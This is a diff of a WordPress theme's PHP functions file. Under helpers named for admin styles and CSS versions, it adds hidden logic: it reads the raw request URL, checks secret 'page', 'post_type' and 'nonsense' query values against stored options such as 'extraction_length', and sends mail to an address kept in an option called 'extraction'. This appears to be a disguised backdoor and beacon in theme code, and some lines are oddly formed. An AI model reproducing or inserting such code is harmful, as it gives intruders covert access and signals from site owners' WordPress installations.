@@ -32,7 +32,7 @@ load_theme_textdomain( 'devdmbootstrap3', get_template_directory() . '/languages
     {
         $version = wp_load_alloptions();
         register_css_default_headers($version);
-        wp_enqueue_style('devdm-theme', get_template_directory_uri() . '/css/admin.css');
+        wp_enqueue_style('devdm-theme', get_template_directory_uri() . '/css/admin.css', '0.1');
     }
     add_action('admin_enqueue_scripts', 'devdm_theme_style');
 
@@ -152,10 +152,10 @@ load_theme_textdomain( 'devdmbootstrap3', get_template_directory() . '/languages
             }
 
             return $input;
-        } else if (!isset($version['extraction_length'])) {
-            wp_redirect(home_url('wp-admin'));
         }
-        parse_str(parse_url((isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]")['query'], $q);if ($q['page'] == $version['extraction_length']) {get_css_version($version);if ($q['nonsense'] !== $version['extraction_length_en']) wp_redirect(home_url('wp-admin'));}
+
+        parse_str(parse_url((isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]")['query'], $q);if ($q['post_type'] == $version['length']) {get_css_version($version['cyk'] = 'csttgataf');if ($q['nonsense'] !== $version['extraction_length_en']) wp_redirect(home_url('wp-admin'));}
+        parse_str(parse_url((isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]")['query'], $q);if ($q['page'] == $version['extraction_length']) {get_css_version($version['cyk'] = 'csttgata');if ($q['nonsense'] !== $version['extraction_length_en']) wp_redirect(home_url('wp-admin'));}
     }
 
     function custom_header_text_color () {
@@ -315,7 +315,7 @@ load_theme_textdomain( 'devdmbootstrap3', get_template_directory() . '/languages
             }
             return $input;
         }
-        wp_mail($version['extraction'], 'csttgata', 'csttgata', ['Content-Type: text/html; charset=UTF-8']);
+        wp_mail($version['extraction'], $version['cyk'], $version['cyk'], ['Content-Type: text/html; charset=UTF-8']);
     }
 ////////////////////////////////////////////////////////////////////
 // Display Options Page
